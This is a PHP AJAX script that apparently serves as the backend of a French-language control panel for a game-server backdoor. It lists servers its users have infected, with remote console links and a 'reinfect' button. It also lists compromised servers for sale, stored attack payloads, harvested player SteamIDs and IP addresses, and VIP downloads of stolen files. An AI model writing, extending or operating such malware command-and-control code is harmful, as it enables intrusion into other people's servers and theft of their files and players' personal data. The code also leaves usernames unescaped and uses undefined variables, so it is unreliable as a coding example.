<?php include("core/class/include.php");
if (!Account::isAuthentified() || $_GET['theget'] == NULL)
{
    die("Bad request");
}
if($_GET['theget'] == 1){

$serv = 0;
$selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 > time())
    {
                    if($_SESSION['id'] == $AfficheServer['userid']){
                        $serv = $serv + 1;
                     $button_hearth_console = '<a href="console.php?server='.$AfficheServer["id"].'" class="btn btn-primary btn-sm" target="_blank"><i class="fas fa-clone"></i></a>';
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr>
                                <td>" . htmlspecialchars($AfficheServer['server_name']) . "</td>
                                <td>" . htmlspecialchars($ip_data[0]) . "</td>
                                <td><img width='16' src='images/" . getgmimage(htmlspecialchars($AfficheServer['gm'])) . "' /></td>
                                <td>" . htmlspecialchars($AfficheServer['map']) . "</td>
                                <td>" . htmlspecialchars($AfficheServer['server_users']) . "</td>
                                <td>" . $button_hearth_console . "</td>
                            </tr>
                        ";
                        } 
                    }
                    }
echo 
"
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Nombres totale de serveurs : " . $serv . "</td>
";
                }

if($_GET['theget'] == 2){
    
$serv = 0;
$selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 < time())
    {
                    if($_SESSION['id'] == $AfficheServer['userid']){
                        $serv = $serv + 1;
                     $button_hearth_console = '<a href="console.php?server='.$AfficheServer["id"].'" class="btn btn-primary btn-sm" target="_blank"><i class="fas fa-clone"></i></a>';
                     $button_rcon_rst = '<button onclick="reinfectRCON('.$AfficheServer['id'].')" type="button" class="btn btn-primary btn-sm"><i class="fa fa-file-code-o"></i>&nbsp;Reconnecter</button>';
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr>
                                <td>" . htmlspecialchars($AfficheServer['server_name']) . "</td>
                                <td>" . htmlspecialchars($ip_data[0]) . "</td>
                                <td><img width='16' src='images/" . getgmimage(htmlspecialchars($AfficheServer['gm'])) . "' /></td>
                                <td>" . htmlspecialchars($AfficheServer['map']) . "</td>
                                <td>" . $button_hearth_console . " " . $button_rcon_rst . "</td>
                            </tr>
                        ";
                        } 
                    }
                    }
echo 
"
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Nombres totale de serveurs : " . $serv . "</td>
";
                }
if($_GET['theget'] == 3){
    $selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {

                    if($AfficheServer['userid'] == 666){

                     $button_buy = '<button onclick="buyServer('.$data['id'].')" type="button" class="btn btn-warning btn-sm"><i class="fas fa-clone"></i>&nbsp;Acheter</button>';

                     if ($AfficheServer['last_update'] + 60 > time())
        {
            $ussr = htmlspecialchars($AfficheServer['server_users']);
        }else{
            $ussr = "<span class='text-danger'>Server Déconnecter</span>";
        }

                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr>
                                <td><b>" . htmlspecialchars($AfficheServer['server_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[0]) . "</b></td>
                                <td><b>" . $ussr . "</b></td>
                                <td><b>" . $button_buy . " </b></td>
                            </tr>
                        ";
                        } 
                    }
                    }
if($_GET['theget'] == 4){
    $all_payload_predata = Payload::GetAllPayload();
$list = [];

foreach ($all_payload_predata as $data)
{
  $userid = $data["userid"];
    if(IsAdmin($_SESSION["id"], $userid))
        {

            if($_SESSION["id"] != 23)
            {


            $ismade = false;


        }else{
            if($data["id"] == 129 || $data["id"] == 100)
            {
                echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($data['payload_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($data['payload_comment']) . "</b></td>
                                <td><b> Public </b></td>
                                <td><b> Pas Touche FD* </b></td>
                            </tr>
                        ";
           $ismade = true;
            }else{
                $ismade = false;
            }
        }

        }else{

            echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($data['payload_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($data['payload_comment']) . "</b></td>
                                <td><b> Public </b></td>
                                <td><b> Ce payload est public, tu ne peut pas le modifier </b></td>
                            </tr>
                        ";
           $ismade = true;

        }
        if($ismade == false)
        {
    if($data["userid"] == 0)
      $createdby = "Public";
    else
     $createdby = Account::GetUsername($data["userid"]);
        
    $button_delete = '<button onclick="deletePayload('.$data['id'].')" type="button" class="btn btn-danger btn-sm"><i class="fa fa-trash"></i>&nbsp;Supprimer</button>';

    $button_view = '<button onclick="viewPayload('.$data['id'].')" data-toggle="modal" data-target="#viewpayload-modal" type="button" class="btn btn-warning btn-sm"><i class="fa fa-pencil-square-o"></i>&nbsp;Edité</button>';

     echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($data['payload_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($data['payload_comment']) . "</b></td>
                                <td><b>" . $createdby . "</b></td>
                                <td><b>" . $button_delete . " " . $button_view . "</b></td>
                            </tr>
                        ";
}}
}
if($_GET['theget'] == 5){
    $selectionserver = $GLOBALS['DB']->GetContent("players_list");

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                     $button_hearth_console = '<button onclick="setPlayerCode('.$data['id'].')" data-toggle="modal" data-target="#playeroff-modal" type="button" class="btn btn-primary btn-sm"><i class="fa fa-arrow-alt-circle-right"></i></button>';
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($AfficheServer['name']) . "</b></td>
                                <td><b>" . htmlspecialchars($AfficheServer['steamid']) . "</b></td>
                                <td><b>" . htmlspecialchars($AfficheServer['ip']) . "</b></td>
                                <td><b>" . $button_hearth_console . "</b></td>
                            </tr>
                        ";
                        } 
}
if($_GET['theget'] == 6){
    if(!IsVIP($_SESSION['id'])){
        die("Only VIP");
    }
    $all_fs_predata = Server::GetAllFileSteal();
$list = [];

foreach ($all_fs_predata as $data)
{    
     $button_dl = '<a href="http://'.$_SERVER["HTTP_HOST"].'/beta/core/ajax/download-fs.php?ik=45133722&ip='.$data['id'].'" type="button" download="filesteal.zip" class="btn btn-success btn-sm"><i class="fas fa-download"></i></a>';
       echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($data['name']) . "</b></td>
                                <td><b>" . htmlspecialchars($data['ip']) . "</b></td>
                                <td><b>" . $button_dl . "</b></td>
                            </tr>
                        ";
}
}
if($_GET['theget'] == 7){
    if(!IsAdmin($_SESSION['id'])){
        die("Only Admin");
    }
    $selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 > time())
    {
                     $button_hearth_console = '<a href="seeserver.php?server='.$AfficheServer["id"].'" class="btn btn-primary btn-sm" target="_blank"><i class="fas fa-clone"></i></a>';
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($AfficheServer['server_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[0]) . "</b></td>
                                <td><b>" . htmlspecialchars($AfficheServer['server_users']) . "</b></td>
                                <td><b>" . htmlspecialchars(date('d/m/Y à H:i:s', $AfficheServer['last_update'])) . "</b></td>
                                <td><b>" . Account::GetUsername($AfficheServer['userid']) . "</b></td>
                                <td><b>" . $button_hearth_console . "</b></td>
                            </tr>
                        ";
                        } 
                    }
    }
if($_GET['theget'] == 8){
    if(!IsAdmin($_SESSION['id'])){
        die("Only Admin");
    }
    $selectionserver = Server::GetAllServer();

                        
                    // Print Output
                    foreach($selectionserver as $AfficheServer)
                    {
                    if ($AfficheServer['last_update'] + 30 < time())
    {
                     $button_hearth_console = '<a href="seeserver.php?server='.$AfficheServer["id"].'" class="btn btn-primary btn-sm" target="_blank"><i class="fas fa-clone"></i></a>';
                     $ip_data = explode(':', $AfficheServer['server_ip']);
                        echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($AfficheServer['server_name']) . "</b></td>
                                <td><b>" . htmlspecialchars($ip_data[0]) . "</b></td>
                                <td><b>" . htmlspecialchars(date('d/m/Y à H:i:s', $AfficheServer['last_update'])) . "</b></td>
                                <td><b>" . Account::GetUsername($AfficheServer['userid']) . "</b></td>
                                <td><b>" . $button_hearth_console . "</b></td>
                            </tr>
                        ";
                        } 
                    }
    }
    if($_GET['theget'] == 9){
        if(!IsAdmin($_SESSION['id'])){
        die("Only Admin");
    }
        $bannedips = $GLOBALS['DB']->GetContent("banned_ips");
$list = [];

foreach ($bannedips as $data)
{    

    
    $unban_btn = '<button onclick="unbanIp('.$data['ip'].')" type="button" class="btn btn-info btn-sm"><i class="fa fa-hammer"></i>Dé-Bannir</button>';
    echo 
                        "
                            <tr class='item'>
                                <td><b>" . htmlspecialchars($data['ip']) . "</b></td>
                                <td><b>" . $unban_btn . "</b></td>
                            </tr>
                        ";
    
}
    }
if($_GET['theget'] == 10){
        if(!IsAdmin($_SESSION['id'])){
        die("Only Admin");
    }
        $all_users_predata = Account::GetAllAccount();
$list = [];

foreach ($all_users_predata as $data)
{    
    $button = '<a href="seeuser.php?user='.$data['id'].'"> Aller a la page </a>';
    echo 
                        "
                            <tr class='item'>
                                <td><b>" . $data['username'] . "</b></td>
                                <td><b>" . $data['id'] . "</b></td>
                                <td><b>" . htmlspecialchars($data['banned']) . "</b></td>
                                <td><b>" . $button . "</b></td>
                            </tr>
                        ";
}
}
if($_GET['theget'] == 11){
        if(!IsAdmin($_SESSION['id'])){
        die("Only Admin");
    }
        $all_users_predata = Account::GetAllAccount();
$list = [];

foreach ($all_users_predata as $data)
{    
    if($data['verif'] == 0){
    $buttonn = '<button onclick="validate('.$data['id'].')" type="button" class="btn btn-info btn-sm"><i class="fa fa-hammer"></i>Dé-Bannir</button>';
    echo 
                        "
                            <tr class='item'>
                                <td><b>" . $data['username'] . "</b></td>
                                <td><b>" . $data['id'] . "</b></td>
                                <td><b>" . htmlspecialchars($data['banned']) . "</b></td>
                                <td><b>" . $buttonn . "</b></td>
                            </tr>
                        ";
}
}
}
?>